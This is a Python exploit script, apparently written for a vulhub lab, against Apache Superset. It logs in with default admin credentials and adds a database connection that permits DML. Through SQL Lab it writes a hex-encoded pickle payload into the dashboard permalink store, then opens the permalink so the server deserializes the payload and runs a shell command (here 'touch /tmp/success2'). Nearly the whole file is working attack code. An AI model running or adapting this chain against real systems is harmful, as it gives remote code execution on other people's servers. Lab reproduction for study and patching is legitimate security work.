# Superset test
import requests
from loguru import logger
from bs4 import BeautifulSoup
import re

base_url = "http://localhost:8088"

s = requests.Session()

def html_2_json(html_str):
    soup = BeautifulSoup(html_str, "html.parser")
    result = {}

    # 1. Extract CSRF tokens from common meta tags
    metas = soup.find_all("meta")
    csrf_meta = [
        meta
        for meta in metas
        if meta.get("name", "").lower()
        in {"csrf-token", "csrf_token", "_csrf", "xsrf-token", "x-csrf-token"}
    ]
    for meta in csrf_meta:
        result["csrf_token"] = meta.get("content")

    # 2. Extract CSRF and other security values from input elements
    # Common key list; extend as needed
    csrf_input_names = [
        "csrfmiddlewaretoken",
        "_csrf",
        "csrf_token",
        "csrf",
        "authenticity_token",
        "xsrf-token",
        "token",
        "requesttoken",
        "__c"
    ]
    for name in csrf_input_names:
        inp = soup.find("input", {"name": name})
        if inp and inp.get("value"):
            result["csrf_token"] = inp["value"]
            break  # Stop once one is found

    # 3. Handle key-value pairs such as <input name="project[namespace_id]" ...>
    # Extract all input elements that have a value attribute
    for inp in soup.find_all("input"):
        name = inp.get("name")
        value = inp.get("value")
        if name and value:
            # For example, name="project[namespace_id]"
            if "[" in name and "]" in name:
                key = name.split("[")[-1].replace("]", "")
                result[key] = value
            elif "token" in name.lower() or "id" in name.lower():
                # For example, input name="user_id"
                result[name] = value

    # 4. Extract JS objects from HTML text, such as "csrfToken": "xxxx" or 'csrfToken': 'xxxx'
    pattern_list = [
        r'"csrfToke[n]?"\s*:\s*["\']([^"\']+)["\']',  # "csrfToken": "xxx"
        r'name="_csrf"\s+value="([a-zA-Z0-9_\-]+)"',  # name="_csrf" value="xxx"
        r'name="csrfmiddlewaretoken"\s+value="([a-zA-Z0-9_\-]+)"',  # Django
        r'"x-csrf-token"\s*:\s*"([^"]+)"',
        r'"authenticity_token"\s*:\s*"([^"]+)"',
        r'CSRF\s*=\s*"([^"]+)"',
        r'__c=([A-Za-z0-9]+)',
    ]
    for pattern in pattern_list:
        m = re.search(pattern, html_str, re.IGNORECASE)
        if m:
            result["csrf_token"] = m.group(1)
            break

    # 5. Other common cases can be extended in the same way...

    # 6. Add custom extraction for other key fields, such as namespace_id
    namespace_input = soup.find("input", {"name": "project[namespace_id]"})
    if namespace_input and namespace_input.get("value"):
        result["namespace_id"] = namespace_input["value"]

    # 7. Extract common hidden input parameters
    for inp in soup.find_all("input", {"type": "hidden"}):
        if inp.get("name") and inp.get("value"):
            if inp.get("name") not in result:
                result[inp.get("name")] = inp.get("value")

    # Return a dict or JSON string as needed
    return result  # To return JSON: json.dumps(result, ensure_ascii=False, indent=2)


def random_string(length=10):
    """
    Generate a random string
    """
    import random
    import string
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def request_id(response):
    return response.headers.get("X-Request-Id")


def log_response(label, response, capture=True, include_history=True):
    responses = list(response.history) + [response] if include_history else [response]
    rid_label = "X-Request-Id" if capture else "RID"
    for index, item in enumerate(responses):
        req = item.request
        suffix = "" if len(responses) == 1 else f" redirect[{index}]"
        logger.debug(
            f"{label}{suffix} {req.method} {req.url} "
            f"Code: {item.status_code} {rid_label}: {request_id(item)}"
        )


def attack():
    """
    Test login
    """
    url = f"{base_url}/login/"
    response = s.get(url)
    log_response("GET /login/", response, capture=False)

    csrf_token = html_2_json(response.text).get("csrf_token")
    url = f"{base_url}/login/"
    data = {
        "csrf_token": csrf_token,
        "username": "admin",
        "password": "vulhub",
    }
    response = s.post(url, data=data, allow_redirects=False)
    log_response("POST /login/", response)
    if response.is_redirect:
        location = response.headers.get("Location", "/superset/welcome/")
        redirect_url = f"{base_url}{location}" if location.startswith("/") else location
        response = s.get(redirect_url, allow_redirects=True)
        log_response("GET login redirect", response, capture=False)

    url = f"{base_url}/superset/welcome/"
    response = s.get(url, allow_redirects=True)
    head_csrf_token = html_2_json(response.text).get("csrf_token")
    log_response("GET /superset/welcome/", response, capture=False)

    url = f"{base_url}/api/v1/me/"
    response = s.get(url, allow_redirects=True)
    log_response("GET /api/v1/me/", response, capture=False)


    url = f"{base_url}/dashboard/new/"
    
    # Track all redirects to get the final dashboard ID
    current_url = url
    max_redirects = 5
    redirect_count = 0
    dashboard_id = None
    
    while redirect_count < max_redirects:
        response = s.get(current_url, allow_redirects=False)
        log_response(f"GET {current_url}", response)
        
        if response.status_code in (301, 302, 303, 307, 308):
            location = response.headers.get('Location')
            # Check whether it contains the dashboard ID
            if location:
                match = re.search(r'/dashboard/(\d+)/', location)
                if match:
                    dashboard_id = match.group(1)
                    break
                
                # Build the full URL if it is relative
                if location.startswith('/'):
                    current_url = f"{base_url}{location}"
                else:
                    current_url = location
                redirect_count += 1
        else:
            logger.info(f"Final response status: {response.status_code}")
            # Check whether the response body contains the dashboard ID
            if not dashboard_id:
                match = re.search(r'/dashboard/(\d+)/', response.text)
                if match:
                    dashboard_id = match.group(1)
                    logger.info(f"Found Dashboard ID in response: {dashboard_id}")
            break
    
    if dashboard_id:
        logger.info(f"Successfully captured Dashboard ID: {dashboard_id}")
    else:
        logger.warning("Failed to capture Dashboard ID")
        logger.info(response.text)

    # Get the share-link key
    if dashboard_id:
        url = f"{base_url}/api/v1/dashboard/{dashboard_id}/permalink"
        headers = {
            "Origin": base_url,
        }
        payload = {
            "filterState":{},
            "urlParams":[]
        }
        response = s.post(url, headers=headers, json=payload)
        perm_url = response.json().get("url")
        logger.success(f"Successfully captured permalink URL: {perm_url}")
        log_response(f"POST {url}", response)
    else:
        logger.warning("Failed to get dashboard ID")
    
    url = f"{base_url}/api/v1/database/"
    headers = {
        "Origin": base_url,
        "X-CSRFToken": head_csrf_token
    }
    payload = {
        "engine":"postgresql",
        "configuration_method":"sqlalchemy_form",
        "database_name":"PostgreSQL-Test-" + random_string(4),
        "sqlalchemy_uri":"postgresql+psycopg2://superset:superset@postgres:5432/superset",
        "expose_in_sqllab":True,
        "allow_dml":True
    }
    response = s.post(url, headers=headers, json=payload, allow_redirects=True)
    logger.info(response.json())
    log_response(f"POST {url}", response)
    database_id = response.json().get("id")

    url = f"{base_url}/api/v1/database/"
    response = s.get(url, allow_redirects=True)
    log_response(f"GET {url}", response, capture=False)

    url = f"{base_url}/api/v1/dashboard/_info?q=(keys:!(permissions))"
    response = s.get(url, allow_redirects=True)
    log_response(f"GET {url}", response, capture=False)

    url = f"{base_url}/superset/sql_json/"
    payload ={
        "client_id":"",
        "database_id":database_id,
        "json":True,
        "runAsync":False,
        "schema":None,
        "sql":"update key_value set value='\\x63706f7369780a73797374656d0a70300a2856746f756368202f746d702f73756363657373320a70310a7470320a5270330a2e' where resource='dashboard_permalink'",
        "sql_editor_id":"1",
        "tab":"TestQuery-" + random_string(4),
        "tmp_table_name":"",
        "select_as_cta":False,
        "ctas_method":"TABLE",
        "queryLimit":1000,
        "expand_data":True
    }
    response = s.post(url, headers=headers, json=payload, allow_redirects=True) 
    logger.warning(response.text)
    log_response(f"POST {url}", response)

    url = perm_url
    response = s.get(url, allow_redirects=True)
    log_response(f"GET {url}", response)



if __name__ == "__main__":
    attack()
    pass

# docker compose exec web ls /tmp
